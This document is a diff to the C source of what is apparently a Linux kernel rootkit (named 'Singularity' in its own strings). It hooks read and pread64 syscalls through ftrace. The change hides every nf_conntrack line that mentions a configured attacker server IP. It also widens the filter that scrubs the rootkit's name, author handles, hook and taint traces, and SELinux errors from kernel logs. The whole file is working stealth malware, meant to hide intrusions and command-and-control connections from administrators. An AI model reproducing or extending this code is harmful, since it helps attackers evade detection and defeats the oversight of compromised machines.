@@ -16,6 +16,8 @@ extern bool ftrace_write_intercepted;
 static DEFINE_SPINLOCK(ftrace_read_lock);
 static unsigned long last_ftrace_read_jiffies = 0;
 
+static __be32 hidden_conntrack_ip;
+
 static const char *virtual_fs_types[] = {
     "proc", "procfs", "sysfs", "tracefs", "debugfs", NULL
 };
@@ -322,6 +324,112 @@ static notrace bool is_touched_functions_file(struct file *file)
             strcmp(sb->s_type->name, "debugfs") == 0);
 }
 
+static notrace bool is_nf_conntrack_file(struct file *file)
+{
+    const char *name;
+    struct dentry *dentry, *parent;
+    
+    if (!file || !file->f_path.dentry)
+        return false;
+    
+    if (strncmp(current->comm, "conntrack", 9) == 0)
+        return false;
+    
+    dentry = file->f_path.dentry;
+    name = dentry->d_name.name;
+    
+    if (!name || strcmp(name, "nf_conntrack") != 0)
+        return false;
+    
+    parent = dentry->d_parent;
+    if (!parent || !parent->d_name.name || strcmp(parent->d_name.name, "net") != 0)
+        return false;
+    
+    return true;
+}
+
+static notrace bool line_contains_hidden_ip(const char *line)
+{
+    char ip_str[20];
+    
+    if (!line)
+        return false;
+    
+    snprintf(ip_str, sizeof(ip_str), "%pI4", &hidden_conntrack_ip);
+    
+    return (strstr(line, ip_str) != NULL);
+}
+
+static notrace ssize_t filter_conntrack_output(char __user *user_buf, ssize_t bytes_read)
+{
+    char *kernel_buf, *filtered_buf, *line_start, *line_end;
+    size_t filtered_len = 0;
+    
+    if (bytes_read <= 0 || !user_buf)
+        return bytes_read;
+    
+    if (bytes_read > MAX_CAP)
+        bytes_read = MAX_CAP;
+
+    kernel_buf = kvmalloc(bytes_read + 1, GFP_KERNEL);
+    if (!kernel_buf)
+        return bytes_read;
+
+    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
+        kvfree(kernel_buf);
+        return bytes_read;
+    }
+    kernel_buf[bytes_read] = '\0';
+
+    filtered_buf = kvzalloc(bytes_read + 1, GFP_KERNEL);
+    if (!filtered_buf) {
+        kvfree(kernel_buf);
+        return bytes_read;
+    }
+
+    line_start = kernel_buf;
+    while ((line_end = strchr(line_start, '\n'))) {
+        size_t line_len = line_end - line_start;
+        char saved = *line_end;
+        *line_end = '\0';
+        
+        if (!line_contains_hidden_ip(line_start)) {
+            if (filtered_len + line_len + 1 <= bytes_read) {
+                memcpy(filtered_buf + filtered_len, line_start, line_len);
+                filtered_len += line_len;
+                filtered_buf[filtered_len++] = '\n';
+            }
+        }
+        
+        *line_end = saved;
+        line_start = line_end + 1;
+    }
+
+    if (*line_start && !line_contains_hidden_ip(line_start)) {
+        size_t remaining = strlen(line_start);
+        if (filtered_len + remaining <= bytes_read) {
+            memcpy(filtered_buf + filtered_len, line_start, remaining);
+            filtered_len += remaining;
+        }
+    }
+
+    if (filtered_len == 0) {
+        kvfree(kernel_buf);
+        kvfree(filtered_buf);
+        return 0;
+    }
+
+    if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
+        kvfree(kernel_buf);
+        kvfree(filtered_buf);
+        return bytes_read;
+    }
+
+    kvfree(kernel_buf);
+    kvfree(filtered_buf);
+    return filtered_len;
+}
+
 static notrace ssize_t filter_trace_output(char __user *user_buf, ssize_t bytes_read)
 {
     static char frozen_header[4096] = {0};
@@ -526,10 +634,9 @@ static notrace ssize_t filter_trace_pipe_output(char __user *user_buf, ssize_t b
 notrace static bool should_filter_file(const char *filename) {
     if (!filename)
         return false;
-    if (strstr(filename, "audit.log") != NULL)
-        return true;
+
     return (strcmp(filename, "kmsg") == 0 || strcmp(filename, "kallsyms") == 0 ||
-            strcmp(filename, "enabled_functions") == 0 || strcmp(filename, "control") == 0 ||
+            strcmp(filename, "enabled_functions") == 0 ||
             strcmp(filename, "debug") == 0 || strcmp(filename, "trace") == 0 ||
             strcmp(filename, "kern.log") == 0 || strcmp(filename, "kern.log.1") == 0 ||
             strcmp(filename, "syslog") == 0 || strcmp(filename, "auth.log") == 0 ||
@@ -542,49 +649,75 @@ notrace static bool is_kmsg_device(const char *filename) {
     return filename && strcmp(filename, "kmsg") == 0;
 }
 
-notrace static bool line_contains_sensitive_info(const char *line) {
+notrace static bool line_contains_sensitive_info(const char *line)
+{
     const char *p;
-    
+
     if (!line)
         return false;
-    
+
     for (p = line; *p; p++) {
         switch (*p) {
+
         case '_':
             if (strncmp(p, "__builtin__ftrace", 17) == 0) return true;
             break;
+
         case 'c':
             if (strncmp(p, "create_trampoline+", 18) == 0) return true;
             if (strncmp(p, "constprop", 9) == 0) return true;
             if (strncmp(p, "clear_taint", 11) == 0) return true;
+
+            if (strncmp(p, "called before initial load_policy", 33) == 0)
+                return true;
             break;
+
         case 'h':
             if (strncmp(p, "hook", 4) == 0) return true;
             break;
-        case 'j':
-            if (strncmp(p, "journal", 7) == 0) return true;
-            break;
+
+       // case 'j':
+         //   if (strncmp(p, "journal", 7) == 0) return true;
+           // break;
+
         case 't':
             if (strncmp(p, "taint", 5) == 0) return true;
             break;
+
         case 's':
             if (strncmp(p, "singularity", 11) == 0) return true;
+
+            if (strncmp(p, "security_sid_to_context_core", 28) == 0)
+                return true;
             break;
+
         case 'S':
             if (strncmp(p, "Singularity", 11) == 0) return true;
             break;
+
+        case 'u':
+            if (strncmp(p, "unrecognized netlink message", 28) == 0)
+                return true;
+            if (strncmp(p, "unknown SID", 11) == 0)
+                return true;
+            break;
+
         case 'm':
             if (strncmp(p, "matheuz", 7) == 0) return true;
             break;
+
         case 'z':
             if (strncmp(p, "zer0t", 5) == 0) return true;
             break;
+
         case 'o':
             if (strncmp(p, "obliviate", 9) == 0) return true;
             break;
+
         case 'k':
             if (strncmp(p, "kallsyms_lookup_name", 20) == 0) return true;
             break;
+
         case 'f':
             if (strncmp(p, "filter_kmsg", 11) == 0) return true;
             if (strncmp(p, "fh_install", 10) == 0) return true;
@@ -593,8 +726,11 @@ notrace static bool line_contains_sensitive_info(const char *line) {
             break;
         }
     }
+
     return false;
 }
+
+
 
 notrace static bool is_virtual_file(struct file *file) {
     const char *fsname;
@@ -701,100 +837,6 @@ notrace static ssize_t filter_kmsg_line(char __user *user_buf, ssize_t bytes_rea
     return ret;
 }
 
-notrace static ssize_t read_and_filter(struct file *file, char __user *user_buf, size_t user_count) {
-    char *kbuf, *total_buf, *filtered, *line_start, *line_end;
-    loff_t pos;
-    ssize_t got, ret = 0, to_read;
-    size_t filtered_len = 0, total_len, to_copy;
-
-    if (!file || !user_buf)
-        return -EFAULT;
-    if (user_count <= 1)
-        return 0;
-    if (is_virtual_file(file))
-        return -EOPNOTSUPP;
-
-    to_read = user_count;
-    if (to_read < MIN_KERNEL_READ)
-        to_read = MIN_KERNEL_READ;
-    if (to_read > MAX_CAP)
-        to_read = MAX_CAP;
-
-    kbuf = kvmalloc(to_read + 1, GFP_KERNEL);
-    if (!kbuf)
-        return -ENOMEM;
-
-    total_buf = kvmalloc(MAX_CAP + 1, GFP_KERNEL);
-    if (!total_buf) {
-        kvfree(kbuf);
-        return -ENOMEM;
-    }
-    total_len = 0;
-    pos = 0;
-
-    while (total_len < MAX_CAP) {
-        got = kernel_read(file, kbuf, to_read, &pos);
-        if (got <= 0)
-            break;
-        if (total_len + got > MAX_CAP)
-            got = MAX_CAP - total_len;
-        memcpy(total_buf + total_len, kbuf, got);
-        total_len += got;
-    }
-    kvfree(kbuf);
-
-    if (total_len == 0) {
-        kvfree(total_buf);
-        return 0;
-    }
-    total_buf[total_len] = '\0';
-
-    filtered = kvzalloc(total_len + 1, GFP_KERNEL);
-    if (!filtered) {
-        kvfree(total_buf);
-        return -ENOMEM;
-    }
-
-    line_start = total_buf;
-    while ((line_end = strchr(line_start, '\n'))) {
-        size_t line_len = line_end - line_start;
-        char saved = line_end[0];
-        line_end[0] = '\0';
-        if (!line_contains_sensitive_info(line_start)) {
-            if (filtered_len + line_len + 1 <= total_len) {
-                memcpy(filtered + filtered_len, line_start, line_len);
-                filtered_len += line_len;
-                filtered[filtered_len++] = '\n';
-            }
-        }
-        line_end[0] = saved;
-        line_start = line_end + 1;
-    }
-    if (*line_start && !line_contains_sensitive_info(line_start)) {
-        size_t remaining = strlen(line_start);
-        if (filtered_len + remaining <= total_len) {
-            memcpy(filtered + filtered_len, line_start, remaining);
-            filtered_len += remaining;
-        }
-    }
-    kvfree(total_buf);
-
-    if (filtered_len == 0) {
-        kvfree(filtered);
-        return 0;
-    }
-
-    to_copy = (filtered_len < user_count) ? filtered_len : user_count;
-    if (copy_to_user(user_buf, filtered, to_copy)) {
-        kvfree(filtered);
-        return -EFAULT;
-    }
-    ret = to_copy;
-
-    kvfree(filtered);
-    return ret;
-}
-
 static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
     struct file *file;
     const char *filename;
@@ -861,6 +903,14 @@ static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
         if (orig_res <= 0)
             return orig_res;
         return filter_cgroup_pids(user_buf, orig_res);
+    }
+
+    if (is_nf_conntrack_file(file)) {
+        orig_res = orig_read(regs);
+        fput(file);
+        if (orig_res <= 0)
+            return orig_res;
+        return filter_conntrack_output(user_buf, orig_res);
     }
 
     if (is_trace_pipe_file(file)) {
@@ -1007,6 +1057,14 @@ static notrace asmlinkage ssize_t hook_read_ia32(const struct pt_regs *regs) {
         return filter_cgroup_pids(user_buf, orig_res);
     }
 
+    if (is_nf_conntrack_file(file)) {
+        orig_res = orig_read_ia32(regs);
+        fput(file);
+        if (orig_res <= 0)
+            return orig_res;
+        return filter_conntrack_output(user_buf, orig_res);
+    }
+
     if (is_trace_pipe_file(file)) {
         ftrace_disabled = is_ftrace_fake_disabled();
         
@@ -1085,7 +1143,6 @@ static notrace asmlinkage ssize_t hook_pread64(const struct pt_regs *regs) {
     ssize_t res, orig_res;
     int fd = regs->di;
     char __user *user_buf = (char __user *)regs->si;
-    size_t count = (size_t)regs->dx;
 
     if (!orig_pread64 || !user_buf)
         return orig_pread64 ? orig_pread64(regs) : -EFAULT;
@@ -1099,6 +1156,14 @@ static notrace asmlinkage ssize_t hook_pread64(const struct pt_regs *regs) {
             fput(file);
             return 0;
         }
+    }
+
+    if (is_nf_conntrack_file(file)) {
+        orig_res = orig_pread64(regs);
+        fput(file);
+        if (orig_res <= 0)
+            return orig_res;
+        return filter_conntrack_output(user_buf, orig_res);
     }
 
     filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
@@ -1136,7 +1201,6 @@ static notrace asmlinkage ssize_t hook_pread64_ia32(const struct pt_regs *regs) 
     ssize_t res, orig_res;
     int fd = regs->bx;
     char __user *user_buf = (char __user *)regs->cx;
-    size_t count = (size_t)regs->dx;
 
     if (!orig_pread64_ia32 || !user_buf)
         return orig_pread64_ia32 ? orig_pread64_ia32(regs) : -EFAULT;
@@ -1150,6 +1214,14 @@ static notrace asmlinkage ssize_t hook_pread64_ia32(const struct pt_regs *regs) 
             fput(file);
             return 0;
         }
+    }
+
+    if (is_nf_conntrack_file(file)) {
+        orig_res = orig_pread64_ia32(regs);
+        fput(file);
+        if (orig_res <= 0)
+            return orig_res;
+        return filter_conntrack_output(user_buf, orig_res);
     }
 
     filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
@@ -1558,6 +1630,7 @@ static struct ftrace_hook hooks[] = {
 };
 
 notrace int clear_taint_dmesg_init(void) {
+    hidden_conntrack_ip = in_aton(YOUR_SRV_IP);
     return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 }
 
